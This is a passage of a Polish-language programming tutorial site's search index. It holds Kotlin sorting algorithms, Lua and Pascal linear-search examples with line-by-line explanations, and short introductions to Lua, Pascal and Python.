kopcowanie","text":""},{"location":"programming/kotlin/algorithms/sorting/heap-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/heap-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun buildHeap(array: MutableList&lt;Int&gt;, n: Int) {\n    for (i in 1 until n) {\n        var parentIndex = (i - 1) / 2\n        var j = i\n\n        while (j &gt; 0 &amp;&amp; array[j] &gt; array[parentIndex]) {\n            val tmp = array[j]\n            array[j] = array[parentIndex]\n            array[parentIndex] = tmp\n            j = parentIndex\n            parentIndex = (j - 1) / 2\n        }\n    }\n}\n\nfun heapSort(array: MutableList&lt;Int&gt;) {\n    for (i in array.count() - 1 downTo 1) {\n        buildHeap(array, i + 1)\n        val tmp = array[0]\n        array[0] = array[i]\n        array[i] = tmp\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    heapSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/heap-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie przez kopcowanie</p>"},{"location":"programming/kotlin/algorithms/sorting/insertion-sort/","title":"Sortowanie przez wstawianie","text":""},{"location":"programming/kotlin/algorithms/sorting/insertion-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/insertion-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun insertionSort(array: MutableList&lt;Int&gt;) {\n    for (i in 1 until array.count()) {\n        var j = i\n        while (j &gt; 0 &amp;&amp; array[j] &lt; array[j - 1]) {\n            val tmp = array[j]\n            array[j] = array[j - 1]\n            array[j - 1] = tmp\n            j--\n        }\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    insertionSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/insertion-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie przez wstawianie</p>"},{"location":"programming/kotlin/algorithms/sorting/merge-sort/","title":"Sortowanie przez scalanie","text":""},{"location":"programming/kotlin/algorithms/sorting/merge-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/merge-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun merge(array: MutableList&lt;Int&gt;, left: Int, right: Int, division: Int) {\n    val mergedLength = right - left\n    val merged = Array&lt;Int&gt;(mergedLength){0}\n    var index1 = left\n    var index2 = division\n\n    for(i in 0 until mergedLength) {\n        if(index1 &gt;= division) {\n            merged[i] = array[index2]\n            index2++\n        } else if(index2 &gt;= right) {\n            merged[i] = array[index1]\n            index1++\n        } else if(array[index1] &lt;= array[index2]) {\n            merged[i] = array[index1]\n            index1++\n        } else {\n            merged[i] = array[index2]\n            index2++\n        }\n    }\n\n    for(i in left until right) {\n        array[i] = merged[i - left]\n    }\n}\n\nfun mergeSort(array: MutableList&lt;Int&gt;, left: Int, right: Int) {\n    if(right - left &lt;= 1) {\n        return;\n    }\n\n    val division = (left + right) / 2\n    mergeSort(array, left, division)\n    mergeSort(array, division, right)\n\n    merge(array, left, right, division)\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    mergeSort(array, 0, array.count())\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/merge-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie przez scalanie</p>"},{"location":"programming/kotlin/algorithms/sorting/odd-even-sort/","title":"Sortowanie odd-even","text":""},{"location":"programming/kotlin/algorithms/sorting/odd-even-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/odd-even-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun oddEvenSort(array: MutableList&lt;Int&gt;) {\n    for (i in array.indices) {\n        for (j in i % 2 + 1 until array.count() step 2) {\n            if (array[j] &lt; array[j - 1]) {\n                val tmp = array[j]\n                array[j] = array[j - 1]\n                array[j - 1] = tmp\n            }\n        }\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    oddEvenSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/odd-even-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie odd-even</p>"},{"location":"programming/kotlin/algorithms/sorting/quick-sort/","title":"Sortowanie szybkie","text":""},{"location":"programming/kotlin/algorithms/sorting/quick-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/quick-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun quickSort(array: MutableList&lt;Int&gt;, left: Int, right: Int) {\n    if (right &lt;= left) {\n        return\n    }\n\n    val pivot = array[(left + right) / 2]\n    var i = left\n    var j = right\n\n    while (i &lt;= j) {\n        while (array[i] &lt; pivot) {\n            i += 1\n        }\n\n        while (array[j] &gt; pivot) {\n            j -= 1\n        }\n\n        if (i &gt; j) {\n            break\n        } \n\n        val tmp = array[i]\n        array[i] = array[j]\n        array[j] = tmp\n\n        i++\n        j--\n    }\n\n    quickSort(array, left, j)\n    quickSort(array, i, right)\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    quickSort(array, 0, array.count() - 1)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/quick-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie szybkie</p>"},{"location":"programming/kotlin/algorithms/sorting/selection-sort/","title":"Sortowanie przez wybieranie","text":""},{"location":"programming/kotlin/algorithms/sorting/selection-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/kotlin/algorithms/sorting/selection-sort/#implementacja","title":"Implementacja","text":"<pre><code>fun findMin(array: MutableList&lt;Int&gt;, begin: Int): Int {\n    var minIndex = begin\n\n    for (i in begin + 1 until array.count()) {\n        if (array[i] &lt; array[minIndex]) {\n            minIndex = i\n        }\n    }\n\n    return minIndex\n}\n\nfun selectionSort(array: MutableList&lt;Int&gt;) {\n    for (i in array.indices) {\n        val minIndex = findMin(array, i)\n        val tmp = array[i]\n        array[i] = array[minIndex]\n        array[minIndex] = tmp\n    }\n}\n\nfun main() {\n    val array = mutableListOf(7, 3, 0, 1, 5, 2, 5, 19, 10, 5)\n\n    selectionSort(array)\n\n    println(array)\n}\n</code></pre>"},{"location":"programming/kotlin/algorithms/sorting/selection-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie przez wybieranie</p>"},{"location":"programming/kotlin/algorithms/sorting/selection-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Powy\u017csza implementacja sk\u0142ada si\u0119 z dw\u00f3ch funkcji: </p> <ul> <li>pomocniczej funkcji <code>findMin</code> znajduj\u0105cej indeks najmniejszej warto\u015bci na li\u015bcie, pocz\u0105wszy od podanej pozycji,</li> <li>g\u0142\u00f3wnej funkcji sortuj\u0105cej metod\u0105 sortowania przez wybieranie <code>selectionSort</code></li> </ul> <p>Funkcja <code>findMin</code> przyjmuje dwa argumenty: list\u0119 do przeszukania (zmienna <code>array</code>) oraz indeks elementu, od kt\u00f3rego powinni\u015bmy zacz\u0105\u0107 nasze poszukiwania (zmienna <code>begin</code>). Proces znajdowania indeksu warto\u015bci minimalnej wygl\u0105da standardowo: najpierw zak\u0142adamy, \u017ce warto\u015b\u0107 najmniejsza znajduje si\u0119 w pocz\u0105tkowej pozycji (linia 2), a nast\u0119pnie przechodzimy p\u0119tl\u0105 przez pozosta\u0142\u0105 cz\u0119\u015b\u0107 listy (linia 4). Gdy znajdziemy element o warto\u015bci mniejszej ni\u017c dotychczasowe minimum (linia 5) to zapisujemy jego indeks (linia 6). Po sprawdzeniu wszystkich element\u00f3w, zwracamy wynik - indeks najmniejszego elementu na li\u015bcie od wskazanej pozycji (linia 10).</p> <p>W\u0142a\u015bciwe sortowanie sk\u0142ada si\u0119 z jednej p\u0119tli, w kt\u00f3rej przechodzimy przez kolejne pozycje na sortowanej li\u015bcie (linia 14), znajdujemy indeks elementu najmniejszego, pocz\u0105wszy od bie\u017c\u0105cej pozycji (linia 15), a nast\u0119pnie zamieniamy go miejscami z elementem na bie\u017c\u0105cej pozycji (linie 16-18).</p>"},{"location":"programming/lua/","title":"Lua","text":"<p>Lua jest dynamicznym, interpretowanym j\u0119zykiem programowania o wysokim poziomie abstrakcji, zaprojektowanym z my\u015bl\u0105 o osadzaniu go w innych aplikacjach i systemach. Zosta\u0142 stworzony w Rio de Janeiro, w Brazylii, przez zesp\u00f3\u0142 w Laboratorium Grafiki Komputerowej na PUC-Rio. Pierwsze wydanie mia\u0142o miejsce w 1993 roku.</p> <p> Lua</p>"},{"location":"programming/lua/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Wbudowany mechanizm do zarz\u0105dzania pami\u0119ci\u0105: Lua ma wbudowany garbage collector, co oznacza, \u017ce programi\u015bci nie musz\u0105 sami zarz\u0105dza\u0107 alokacj\u0105 i zwalnianiem pami\u0119ci.</p> </li> <li> <p>Dynamiczne typowanie: Lua jest j\u0119zykiem dynamicznie typowanym, co oznacza, \u017ce typy danych s\u0105 sprawdzane podczas wykonywania, a nie w czasie kompilacji.</p> </li> <li> <p>Wbudowane tabele: tabele w Lua s\u0105 podstawowym typem danych i s\u0105 u\u017cywane do tworzenia r\u00f3\u017cnych struktur danych, takich jak tablice, zestawy, listy i mapy.</p> </li> <li> <p>Coroutines: Lua obs\u0142uguje coroutines, co umo\u017cliwia tworzenie bardziej z\u0142o\u017conych przep\u0142yw\u00f3w sterowania, takich jak wsp\u00f3\u0142bie\u017cno\u015b\u0107 i wsp\u00f3\u0142programowanie.</p> </li> <li> <p>Przeno\u015bno\u015b\u0107: Lua jest niewielkim j\u0119zykiem, kt\u00f3ry mo\u017cna \u0142atwo osadzi\u0107 w innych aplikacjach. Dzia\u0142a na wielu platformach i systemach operacyjnych.</p> </li> </ol> <p>Lua jest cz\u0119sto stosowany w bran\u017cy gier, gdzie jest wykorzystywany do skryptowania. Wiele popularnych silnik\u00f3w gier, takich jak Unity3D, Unreal Engine i Roblox, obs\u0142uguje Lua jako j\u0119zyk skryptowy. Lua jest tak\u017ce stosowany w systemach wbudowanych, takich jak routery czy telewizory, ze wzgl\u0119du na swoj\u0105 niewielk\u0105 wielko\u015b\u0107 i \u0142atwo\u015b\u0107 integracji.</p>"},{"location":"programming/lua/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Lua</p>"},{"location":"programming/lua/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/lua/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/lua/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/lua/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>function linearSearch(array, number)\n    for i = 1, #(array) do\n        if array[i] == number then\n            return true\n        end\n    end\n\n    return false\nend\n\narray = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0}\nnumber = 7\n\nresult = linearSearch(array, number)\n\nif result then\n    print(\"Liczba jest w tablicy\")\nelse\n    print(\"Liczby nie ma w tablicy\")\nend\n</code></pre>"},{"location":"programming/lua/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(1\\) do rozmiaru tablicy w\u0142\u0105cznie (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 operatora <code>#()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/lua/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/lua/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>function linearSearch(array, number)\n    for i = 1, #(array) do\n        if array[i] == number then\n            return i\n        end\n    end\n\n    return -1\nend\n\narray = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0}\nnumber = 7\n\nindex = linearSearch(array, number)\n\nif index == -1 then\n    print(\"Liczby nie ma w tablicy\")\nelse\n    print(\"Liczba jest pod indeksem:\", index)\nend\n</code></pre>"},{"location":"programming/lua/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(1\\) do rozmiaru tablicy w\u0142\u0105cznie (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 operatora <code>#()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w tablicy (linia 4). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>-1</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12) oraz warto\u015b\u0107 poszukiwanego elementu (linia 13). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 15). W zale\u017cno\u015bci od wyniku (linia 17) wypisujemy odpowiedni komunikat (linie 18 i 20).</p>"},{"location":"programming/lua/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/lua/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>function linearSearch(array, number)\n    for i = 1, #(array) do\n        if array[i] == number then\n            print(i)\n        end\n    end\nend\n\narray = {8, 2, 8, 4, 5, 6, 7, 8, 9, 8}\nnumber = 8\n\nprint(\"Indeksy, pod kt\u00f3rymi znajduje si\u0119 poszukiwana liczba:\")\nlinearSearch(array, number)\n</code></pre>"},{"location":"programming/lua/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 1) nie zwraca wyniku i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(1\\) do rozmiaru tablicy w\u0142\u0105cznie (linia 2). Rozmiar tablicy pobieramy za pomoc\u0105 operatora <code>#()</code>. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 3). Je\u017celi tak, to wypisujemy ten indeks (linia 4).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 10) oraz warto\u015b\u0107 poszukiwanego elementu (linia 11). Nast\u0119pnie wypisujemy stosowny komunikat (linia 13) wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami (linia 14).</p>"},{"location":"programming/lua/simulations/game-of-life/","title":"Gra w \u017cycie","text":""},{"location":"programming/lua/simulations/game-of-life/#obsuga","title":"Obs\u0142uga","text":"<ul> <li>S - start/stop symulacji</li> <li>D - przyspieszenie</li> <li>A - spowolnienie</li> <li>Q - przej\u015bcie do poprzedniej regu\u0142y</li> <li>E - przej\u015bcie do kolejnej regu\u0142y</li> <li>R - dodanie losowych \"\u017cywych\" kom\u00f3rek</li> <li>Spacja - wykonanie jednego kroku symulacji (je\u017celi jest zatrzymana)</li> <li>Lewy przycisk myszy - dodanie \u017cywej kom\u00f3rki</li> <li>Prawy przycisk myszy - usuni\u0119cie \u017cywej kom\u00f3rki</li> </ul>"},{"location":"programming/lua/simulations/game-of-life/#implementacja","title":"Implementacja","text":"<p>https://replit.com/@damiankurpiewski/Game-of-Life</p>"},{"location":"programming/pascal/","title":"Pascal","text":"<p>Pascal jest j\u0119zykiem programowania stworzonym przez Niklausa Wirtha w latach 60. i 70. XX wieku. J\u0119zyk ten zosta\u0142 nazwany na cze\u015b\u0107 s\u0142ynnego matematyka i filozofa, Blaise'a Pascala. Pascal zosta\u0142 stworzony jako narz\u0119dzie dydaktyczne do nauczania dobrych praktyk programowania i jest znany ze swojej jasnej sk\u0142adni i silnej typizacji.</p>"},{"location":"programming/pascal/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Czysto\u015b\u0107 sk\u0142adni: Pascal jest znanym z czytelnej i zrozumia\u0142ej sk\u0142adni, co pomaga w utrzymaniu kodu i czyni go dobrym j\u0119zykiem dla os\u00f3b, kt\u00f3re dopiero zaczynaj\u0105 swoj\u0105 przygod\u0119 z programowaniem.</p> </li> <li> <p>Silna typizacja: Pascal jest j\u0119zykiem o silnej typizacji, co oznacza, \u017ce typy danych s\u0105 \u015bci\u015ble okre\u015blone i kontrolowane. Pomaga to w wykrywaniu b\u0142\u0119d\u00f3w na etapie kompilacji i zwi\u0119ksza bezpiecze\u0144stwo kodu.</p> </li> <li> <p>Modularno\u015b\u0107: Pascal wspiera podzia\u0142 program\u00f3w na modu\u0142y, co u\u0142atwia zarz\u0105dzanie kodem, poprawia czytelno\u015b\u0107 i wspiera zasady dobrego projektowania oprogramowania.</p> </li> <li> <p>Wsparcie dla strukturalnego programowania: Pascal jest zorientowany na programowanie strukturalne, co promuje jasn\u0105 organizacj\u0119 kodu, co z kolei u\u0142atwia zrozumienie i debugowanie kodu.</p> </li> </ol> <p>Pascal by\u0142 powszechnie u\u017cywany w edukacji informatycznej i naukach \u015bcis\u0142ych do lat 90. Wsp\u00f3\u0142cze\u015bnie jest mniej popularny, ale nadal znajduje zastosowanie w niekt\u00f3rych dziedzinach, takich jak produkcja oprogramowania systemowego. J\u0119zyk ten jest r\u00f3wnie\u017c u\u017cywany jako wprowadzenie do programowania strukturalnego dla pocz\u0105tkuj\u0105cych programist\u00f3w.</p>"},{"location":"programming/pascal/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Object Pascal</p>"},{"location":"programming/pascal/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/pascal/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/pascal/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/pascal/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>program lsearch;\nvar\n    n: integer = 10;\n    arr: array [0..9] of integer = (8, 2, 9, 10, 5, 4, 2, 7, 18, 0);\n    number: integer = 5;\n    result: boolean;\nfunction linear_search(n: integer; arr: array of integer; number: integer): boolean;\nvar\n    i: integer;\n    result: boolean;\nbegin\n    result := false;\n    for i := 0 to n - 1 do\n    begin\n        if (arr[i] = number) then\n        begin\n            result := true;\n            break;\n        end;\n    end;\n    linear_search := result;\nend;\nbegin\n    result := linear_search(n, arr, number);\n    if (result) then\n    begin\n        writeln('Liczba jest w tablicy');\n    end\n    else\n    begin\n        writeln('Liczby nie ma w tablicy');\n    end;\n\nend.\n</code></pre>"},{"location":"programming/pascal/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linear_search</code> (linia 7) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje trzy argumenty: rozmiar tablicy, tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przyjmujemy jako potencjalny wynik warto\u015b\u0107 <code>false</code>, czyli informacj\u0119, \u017ce nie znale\u017ali\u015bmy elementu w tablicy (linia 12). Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy (linia 13). Dla ka\u017cdego indeksu sprawdzamy, czy element zapisany pod tym indeksem jest r\u00f3wny poszukiwanej warto\u015bci (linia 15). Je\u017celi tak, to zapami\u0119tujemy informacj\u0119 o znalezieniu warto\u015bci w zmiennej <code>result</code> (linia 17) i wychodzimy z p\u0119tli za pomoc\u0105 instrukcji <code>break</code> (linia 18). Na koniec zwracamy wynik, czyli warto\u015b\u0107 zmiennej <code>result</code> (linia 21).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: rozmiar tablicy (linia 3), tablic\u0119 (linia 4) oraz warto\u015b\u0107 poszukiwanego elementu (linia 5). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w zmiennej <code>result</code> (linia 24). W zale\u017cno\u015bci od wyniku (linia 25) wypisujemy odpowiedni komunikat (linie 27 i 31).</p>"},{"location":"programming/pascal/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/pascal/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>program lsearch;\nvar\n    n: integer = 10;\n    arr: array [0..9] of integer = (8, 2, 9, 10, 5, 4, 2, 7, 18, 0);\n    number: integer = 5;\n    result: integer;\nfunction linear_search(n: integer; arr: array of integer; number: integer): integer;\nvar\n    i: integer;\n    result: integer;\nbegin\n    result := -1;\n    for i := 0 to n - 1 do\n    begin\n        if (arr[i] = number) then\n        begin\n            result := i;\n            break;\n        end;\n    end;\n    linear_search := result;\nend;\nbegin\n    result := linear_search(n, arr, number);\n    if (result = -1) then\n    begin\n        writeln('Liczby nie ma w tablicy');\n    end\n    else\n    begin\n        write('Liczba jest pod indeksem ');\n        writeln(result);\n    end;\n\nend.\n</code></pre>"},{"location":"programming/pascal/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linear_search</code> (linia 7) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje trzy argumenty: rozmiar tablicy, tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przyjmujemy jako potencjalny wynik warto\u015b\u0107 <code>-1</code>, czyli informacj\u0119, \u017ce nie znale\u017ali\u015bmy elementu w tablicy (linia 12). Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy (linia 13). Dla ka\u017cdego indeksu sprawdzamy, czy element zapisany pod tym indeksem jest r\u00f3wny poszukiwanej warto\u015bci (linia 15). Je\u017celi tak, to zapami\u0119tujemy informacj\u0119 o znalezieniu warto\u015bci w zmiennej <code>result</code> (linia 17) i wychodzimy z p\u0119tli za pomoc\u0105 instrukcji <code>break</code> (linia 18). Na koniec zwracamy wynik, czyli warto\u015b\u0107 zmiennej <code>result</code> (linia 21).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: rozmiar tablicy (linia 3), tablic\u0119 (linia 4) oraz warto\u015b\u0107 poszukiwanego elementu (linia 5). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w zmiennej <code>result</code> (linia 24). W zale\u017cno\u015bci od wyniku (linia 25) wypisujemy odpowiedni komunikat (linie 27 i 31).</p>"},{"location":"programming/pascal/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/pascal/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>program lsearch;\nvar\n    n: integer = 10;\n    arr: array [0..9] of integer = (8, 2, 8, 4, 5, 6, 7, 8, 9, 8);\n    number: integer = 8;\nprocedure linear_search(n: integer; arr: array of integer; number: integer);\nvar\n    i: integer;\nbegin\n    for i := 0 to n - 1 do\n    begin\n        if (arr[i] = number) then\n        begin\n            writeln(i);\n        end;\n    end;\nend;\nbegin\n    writeln('Indeksy, pod kt\u00f3rymi znajduje si\u0119 poszukiwana liczba:');\n    linear_search(n, arr, number);\nend.\n</code></pre>"},{"location":"programming/pascal/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Procedura <code>linear_search</code> (linia 6) przyjmuje trzy argumenty: rozmiar tablicy, tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy (linia 10). Dla ka\u017cdego indeksu sprawdzamy, czy element zapisany pod tym indeksem jest r\u00f3wny poszukiwanej warto\u015bci (linia 12). Je\u017celi tak, to wypisujemy ten indeks (linia 14).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: rozmiar tablicy (linia 3), tablic\u0119 (linia 4) oraz warto\u015b\u0107 poszukiwanego elementu (linia 5). Nast\u0119pnie wypisujemy stosowny komunikat (linia 19) i wywo\u0142ujemy funkcj\u0119 <code>linear_search</code> z wcze\u015bniej przygotowanymi parametrami (linia 20).</p>"},{"location":"programming/python/","title":"Python 3","text":"<p>Python to wysokopoziomowy, interpretowany j\u0119zyk programowania, kt\u00f3ry zyska\u0142 popularno\u015b\u0107 dzi\u0119ki swojej czytelno\u015bci i prostocie sk\u0142adni. Zosta\u0142 stworzony przez Guido van Rossuma i po raz pierwszy opublikowany w 1991 roku. Python jest j\u0119zykiem programowania o og\u00f3lnym przeznaczeniu, ale jest szczeg\u00f3lnie popularny w dziedzinach takich jak analiza danych, uczenie maszynowe i web development.</p> <p> Python</p>"},{"location":"programming/python/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Prostota i czytelno\u015b\u0107: Python jest znany ze swojej sk\u0142adni, kt\u00f3ra jest prosta do zrozumienia i czytelna. Zamiast nawias\u00f3w klamrowych, kt\u00f3re s\u0105 cz\u0119sto u\u017cywane w innych j\u0119zykach programowania, Python u\u017cywa wci\u0119\u0107 do okre\u015blania blok\u00f3w kodu.</p> </li> <li> <p>Dynamiczne typowanie: Python jest j\u0119zykiem dynamicznie typowanym, co oznacza, \u017ce nie musimy z g\u00f3ry okre\u015bla\u0107 typ\u00f3w zmiennych. Dzi\u0119ki temu kod jest bardziej zwi\u0119z\u0142y, chocia\u017c mo\u017ce traci\u0107 na czytelno\u015bci.</p> </li> <li> <p>Bogata biblioteka standardowa: Python ma ogromn\u0105 bibliotek\u0119 standardow\u0105, kt\u00f3ra zawiera wiele przydatnych funkcji i klas. W dodatku, istnieje wiele zewn\u0119trznych bibliotek dost\u0119pnych dla Pythona, kt\u00f3re umo\u017cliwiaj\u0105 wykonywanie specjalistycznych zada\u0144, takich jak analiza danych czy tworzenie grafiki 3D.</p> </li> <li> <p>Wsparcie dla r\u00f3\u017cnych paradygmat\u00f3w programowania: Python obs\u0142uguje wiele paradygmat\u00f3w programowania, w tym programowanie proceduralne, obiektowe i funkcjonalne.</p> </li> <li> <p>Rozszerzalno\u015b\u0107: Python pozwala na integracj\u0119 z kodem napisanym w innych j\u0119zykach, takich jak C lub C++, co umo\u017cliwia wykorzystanie wydajnych bibliotek niskopoziomowych.</p> </li> </ol> <p>Ze wzgl\u0119du na te cechy, Python jest doskona\u0142ym wyborem zar\u00f3wno dla pocz\u0105tkuj\u0105cych, jak i do\u015bwiadczonych programist\u00f3w. Trzeba jednak pami\u0119ta\u0107, \u017ce Python daje programistom bardzo du\u017c\u0105 swobod\u0119, w zwi\u0105zku z tym sami musimy k\u0142a\u015b\u0107 nacisk na to, \u017ceby zadba\u0107 o czytelno\u015b\u0107, wysok\u0105 jako\u015b\u0107 i efektywno\u015b\u0107 naszej implementacji.</p>"},{"location":"programming/python/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka Python</p>"},{"location":"programming/python/algorithms/2d-geometry/point-line-distance/","title":"Odleg\u0142o\u015b\u0107 punktu od 